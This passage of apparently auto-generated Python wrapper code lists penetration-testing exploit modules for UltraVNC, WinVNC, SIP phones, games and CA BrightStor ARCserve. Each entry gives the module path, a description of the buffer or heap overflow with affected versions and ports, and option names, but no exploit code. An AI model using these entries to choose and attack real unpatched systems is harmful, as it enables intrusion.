		
        This module exploits a buffer overflow in UltraVNC Win32
        Viewer 1.0.1 Release.
      
		"""

		path = 'windows/vnc/ultravnc_client'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_vnc_winvnc_http_get(object):
		"""
		
        This module exploits a buffer overflow in the AT&T WinVNC version
        <= v3.3.3r7 web server. When debugging mode with logging is
        enabled (non-default), an overly long GET request can overwrite
        the stack. This exploit does not work well with VNC payloads!
      
		"""

		path = 'windows/vnc/winvnc_http_get'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_vnc_ultravnc_viewer_bof(object):
		"""
		
        This module exploits a buffer overflow in UltraVNC Viewer 1.0.2 Release.

        If a malicious server responds to a client connection indicating a minor
        protocol version of 14 or 16, a 32-bit integer is subsequently read from
        the TCP stream by the client and directly provided as the trusted size for
        further reading from the TCP stream into a 1024-byte character array on
        the stack.
      
		"""

		path = 'windows/vnc/ultravnc_viewer_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_sip_aim_triton_cseq(object):
		"""
		
          This module exploits a buffer overflow in AOL/'s AIM
        Triton 1.0.4. By sending an overly long CSeq value,
        a remote attacker could overflow a buffer and execute
        arbitrary code on the system with the privileges of
        the affected application.
      
		"""

		path = 'windows/sip/aim_triton_cseq'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_sip_sipxezphone_cseq(object):
		"""
		
          This module exploits a buffer overflow in SIPfoundry's
        sipXezPhone version 0.35a. By sending an long CSeq header,
        a remote attacker could overflow a buffer and execute
        arbitrary code on the system with the privileges of
        the affected application.
      
		"""

		path = 'windows/sip/sipxezphone_cseq'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_sip_sipxphone_cseq(object):
		"""
		
          This module exploits a buffer overflow in SIPfoundry's
        sipXphone 2.6.0.27. By sending an overly long CSeq value,
        a remote attacker could overflow a buffer and execute
        arbitrary code on the system with the privileges of
        the affected application.
      
		"""

		path = 'windows/sip/sipxphone_cseq'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_games_mohaa_getinfo(object):
		"""
		
          This module exploits a stack based buffer overflow in the getinfo
        command of Medal Of Honor Allied Assault.
      
		"""

		path = 'windows/games/mohaa_getinfo'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_games_ut2004_secure(object):
		"""
		

      This is an exploit for the GameSpy secure query in
      the Unreal Engine.

      This exploit only requires one UDP packet, which can
      be both spoofed and sent to a broadcast address.
      Usually, the GameSpy query server listens on port 7787,
      but you can manually specify the port as well.

      The RunServer.sh script will automatically restart the
      server upon a crash, giving us the ability to
      bruteforce the service and exploit it multiple
      times.

      
		"""

		path = 'windows/games/ut2004_secure'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_games_racer_503beta5(object):
		"""
		
          This module exploits the Racer Car and Racing Simulator game
        versions v0.5.3 beta 5 and earlier. Both the client and server listen
        on UDP port 26000. By sending an overly long buffer we are able to
        execute arbitrary code remotely.
      
		"""

		path = 'windows/games/racer_503beta5'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_brightstor_tape_engine_0x8a(object):
		"""
		
          This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup
        r11.1 - r11.5. By sending a specially crafted DCERPC request, an attacker could overflow
        the buffer and execute arbitrary code.
      
		"""

		path = 'windows/brightstor/tape_engine_0x8a'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'

	class windows_brightstor_mediasrv_sunrpc(object):
		"""
		
          This exploit targets a stack buffer overflow in the MediaSrv RPC service of CA
        BrightStor Arcserve. By sending a specially crafted SUNRPC request, an attacker
        can overflow a stack buffer and execute arbitrary code.
      
		"""

		path = 'windows/brightstor/mediasrv_sunrpc'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			ONCRPC_tcp_request_fragmentation = 'ONCRPC::tcp_request_fragmentation'
			required_TIMEOUT = 'TIMEOUT'

	class windows_brightstor_lgserver_rxsuselicenseini(object):
		"""
		
          This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup
        for Laptops & Desktops 11.1. By sending a specially crafted request (rxsUseLicenseIni), an
        attacker could overflow the buffer and execute arbitrary code.
      
		"""

		path = 'windows/brightstor/lgserver_rxsuselicenseini'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_brightstor_tape_engine(object):
		"""
		
          This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup
        r11.1 - r11.5. By sending a specially crafted DCERPC request, an attacker could overflow
        the buffer and execute arbitrary code.
      
		"""

		path = 'windows/brightstor/tape_engine'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_brightstor_message_engine_heap(object):
		"""
		
          This module exploits a heap overflow in Computer Associates BrightStor ARCserve Backup
        11.5. By sending a specially crafted RPC request, an attacker could overflow the
        buffer and execute arbitrary code.
      
		"""

		path = 'windows/brightstor/message_engine_heap'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'

	class windows_brightstor_sql_agent(object):
		"""
		
          This module exploits a vulnerability in the CA BrightStor
        Agent for Microsoft SQL Server. This vulnerability was
        discovered by cybertronic[at]gmx.net.
      
		"""

		path = 'windows/brightstor/sql_agent'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_brightstor_discovery_udp(object):
		"""
		
          This module exploits a vulnerability in the CA BrightStor
        Discovery Service. This vulnerability occurs when a large
        request is sent to UDP port 41524, triggering a stack buffer
        overflow.
      
		"""

		path = 'windows/brightstor/discovery_udp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_brightstor_license_gcr(object):
		"""
		
          This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup 11.0.
        By sending a specially crafted request to the lic98rmtd.exe service, an attacker
        could overflow the buffer and execute arbitrary code.
      
		"""

		path = 'windows/brightstor/license_gcr'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_brightstor_universal_agent(object):
		"""
		
          This module exploits a convoluted heap overflow in the CA
        BrightStor Universal Agent service. Triple userland
        exception results in heap growth and execution of
        dereferenced function pointer at a specified address.
      
		"""

		path = 'windows/brightstor/universal_agent'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_brightstor_lgserver_rxssetdatagrowthscheduleandfilter(object):
		"""
		
          This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup
        for Laptops & Desktops 11.1. By sending a specially crafted request (rxsSetDataGrowthScheduleAndFilter),
        an attacker could overflow the buffer and execute arbitrary code.
      
		"""

		path = 'windows/brightstor/lgserver_rxssetdatagrowthscheduleandfilter'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_brightstor_lgserver_rxrlogin(object):
		"""
		
          This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup
        for Laptops & Desktops 11.1. By sending a specially crafted request, an attacker could
        overflow the buffer and execute arbitrary code.
      
		"""

		path = 'windows/brightstor/lgserver_rxrlogin'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_brightstor_lgserver_multi(object):
		"""
		
          This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup
        for Laptops & Desktops 11.1. By sending a specially crafted request to multiple commands,
        an attacker could overflow the buffer and execute arbitrary code.
      
		"""

		path = 'windows/brightstor/lgserver_multi'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_brightstor_etrust_itm_alert(object):
		"""
		
          This module exploits a buffer overflow in Computer Associates Threat Manager for the Enterprise r8.1
        By sending a specially crafted RPC request, an attacker could overflow the buffer and execute arbitrary code.
        In order to successfully exploit this vulnerability, you will need valid logon credentials to the target.
      
		"""

		path = 'windows/brightstor/etrust_itm_alert'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			required_SMBPIPE = 'SMBPIPE'

	class windows_brightstor_hsmserver(object):
		"""
		
          This module exploits one of the multiple stack buffer overflows in Computer Associates BrightStor HSM.
        By sending a specially crafted request, an attacker could overflow the buffer and execute arbitrary code.
      
		"""

		path = 'windows/brightstor/hsmserver'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_brightstor_discovery_tcp(object):
		"""
		
          This module exploits a vulnerability in the CA BrightStor
        Discovery Service. This vulnerability occurs when a specific
        type of request is sent to the TCP listener on port 41523.
        This vulnerability was discovered by cybertronic[at]gmx.net
        and affects all known versions of the BrightStor product.
        This module is based on the 'cabrightstor_disco' exploit by
        HD Moore.
      
		"""

		path = 'windows/brightstor/discovery_tcp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_brightstor_message_engine(object):
		"""
		
          This module exploits a buffer overflow in Computer Associates BrightStor ARCserve Backup
        11.1 - 11.5 SP2. By sending a specially crafted RPC request, an attacker could overflow
        the buffer and execute arbitrary code.
      
		"""

		path = 'windows/brightstor/message_engine'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'

	class windows_brightstor_ca_arcserve_342(object):
		"""
		
          This module exploits a buffer overflow in Computer Associates BrightStor ARCserve r11.5 (build 3884).
        By sending a specially crafted RPC request to opcode 0x342, an attacker could overflow the buffer
        and execute arbitrary code. In order to successfully exploit this vulnerability, you will need
        set the hostname argument (HNAME).
      
		"""

		path = 'windows/brightstor/ca_arcserve_342'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
